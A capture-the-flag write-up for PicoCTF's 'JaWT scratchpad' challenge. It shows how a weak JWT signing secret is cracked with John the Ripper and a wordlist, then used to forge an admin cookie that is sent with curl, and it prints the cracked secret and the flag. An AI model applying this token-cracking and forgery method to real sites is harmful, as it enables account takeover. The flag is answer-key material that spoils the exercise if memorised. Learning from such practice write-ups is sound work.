---
title: "JaWT scratchpad from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# JaWT scratchpad from PicoCTF
[page](https://play.picoctf.org/practice/challenge/25?category=1&difficulty=2&page=1)
>Description
>Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

>Hints
>What is that cookie?
>Have you heard of JWT?

That means we have to modify cookie to access the flag, also that is `JWT token`so we will have to visit this site: [jwt.io](https://jwt.io/) and load the cookie we get after logging in with any user. Just to try login with `admin`but when you try it will deny. So `inspect` and copy the `jwt`cookie you get after logging in: ![](/assets/images/Screenshot from 2024-07-22 19-09-54.png)
Copy that and go to [jwt.io](https://jwt.io/) and paste the cookie there.
Notice how there is `John`in the end with link that takes us to `John The Ripper`, So we have to brute force this token to get the password:
```bash
$ john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt token.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:00 DONE (2024-07-22 19:01) 1.010g/s 7480Kp/s 7480Kc/s 7480KC/s ilovetitor..ilovejesus789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
There it is the password: `ilovepico` go to [jwt.io](https://jwt.io/)  and fill the password in and also change the name to `admin`:
![](/assets/images/Screenshot from 2024-07-22 19-13-53.png)
and use `curl`or `burpsuite`to change the cookie, i used curl because it's faster:
```bash
$ curl http://jupiter.challenges.picoctf.org:63090/ --cookie "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1291  100  1291    0     0   2991      0 --:--:-- --:--:-- --:--:--  2988
					<textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_f859ab2f}</textarea>
```
And that's the flag:
**picoCTF{jawt_was_just_what_you_thought_f859ab2f}**
